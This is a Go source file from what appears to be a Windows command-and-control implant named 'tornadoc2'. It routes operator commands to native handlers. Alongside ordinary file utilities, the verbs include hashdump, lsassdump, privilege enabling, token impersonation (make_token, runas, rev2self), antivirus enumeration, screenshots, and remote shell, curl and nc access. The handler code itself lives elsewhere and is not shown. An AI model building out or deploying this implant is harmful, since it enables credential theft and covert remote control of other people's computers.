//go:build windows

package core

import (
	"fmt"
	"os"
	"strconv"
	"time"
	"tornadoc2/agent/native"
	"tornadoc2/agent/protocol"
)

func isNativeExtraVerb(verb string) bool {
	return nativeExtraVerbs[verb]
}
func (a *Agent) nativeExtraVerb(t protocol.Task) protocol.Result {
	switch t.Verb {
	case "find":
		return NativeFind(t)
	case "grep":
		return NativeGrep(t)
	case "head":
		return NativeHead(t)
	case "tail":
		return NativeTail(t)
	case "stat":
		return NativeStat(t)
	case "strings":
		return NativeStrings(t)
	case "hexdump":
		return NativeHexdump(t)
	case "sha1":
		return NativeHash(t, "sha1")
	case "sha256":
		return NativeHash(t, "sha256")
	case "md5":
		return NativeHash(t, "md5")
	case "ln":
		return NativeLn(t)
	case "touch":
		return NativeTouch(t)
	case "wc":
		return NativeWc(t)
	case "nl":
		return NativeNl(t)
	case "rev":
		return NativeRev(t)
	case "sort":
		return NativeSort(t)
	case "uniq":
		return NativeUniq(t)
	case "tr":
		return NativeTr(t)
	case "cksum":
		return NativeCksum(t)
	case "base64":
		return NativeBase64(t)
	case "gzip":
		return NativeGzip(t, true)
	case "gunzip":
		return NativeGzip(t, false)
	case "which":
		return NativeWhich(t)
	case "ifconfig":
		return NativeIfconfig(t)
	case "readlink":
		return NativeReadlink(t)
	case "realpath":
		return NativeRealpath(t)
	case "du":
		return NativeDu(t)
	case "mkdir":
		return NativeMkdir(t)
	case "rm":
		return NativeRm(t)
	case "cp":
		return NativeCp(t)
	case "mv":
		return NativeMv(t)
	case "chmod":
		return NativeChmod(t)
	case "date":
		now := time.Now()
		out := fmt.Sprintf("local: %s\nutc:   %s\n",
			now.Format("2006-01-02 15:04:05 MST -0700"),
			now.UTC().Format("2006-01-02 15:04:05 UTC -0700"))
		return a.simpleVerb(t, []byte(out))
	case "getpid":
		return a.simpleVerb(t,
			[]byte(strconv.Itoa(os.Getpid())+"\n"))
	case "getppid":
		return a.simpleVerb(t,
			[]byte(strconv.Itoa(os.Getppid())+"\n"))
	case "uptime":
		out, err := native.NativeUptime()
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "df":
		out, err := native.NativeDF(t.Args)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "netstat":
		out, err := native.NativeNetstat(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "arp":
		out, err := native.NativeArp(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "route":
		out, err := native.NativeRoute(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "users":
		out, err := native.NativeUsers(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "groups":
		out, err := native.NativeGroups(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "av-list":
		out, err := native.NativeAvList(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "hashdump":
		out, err := native.NativeHashdump(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "enablepriv":
		out, err := native.NativeEnablePriv(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "lsassdump":
		out, err := native.NativeLsassDump(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "make_token":
		out, err := native.NativeMakeToken(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "runas":
		out, err := native.NativeRunas(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "rev2self":
		out, err := native.NativeRev2Self(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID, Output: encodeOutput([]byte(out))}
	case "shell":
		return NativeShell(t)
	case "curl":
		return NativeCurl(t)
	case "resolve":
		return NativeResolve(t)
	case "nc":
		return NativeNc(t)
	case "screenshot":
		out, err := native.NativeScreenshot(t)
		if err != nil {
			return protocol.Result{ID: t.ID, Error: err.Error()}
		}
		return protocol.Result{ID: t.ID,
			Output: encodeOutput([]byte(out))}
	}
	return protocol.Result{ID: t.ID, Error: "unknown native verb: " + t.Verb}
}
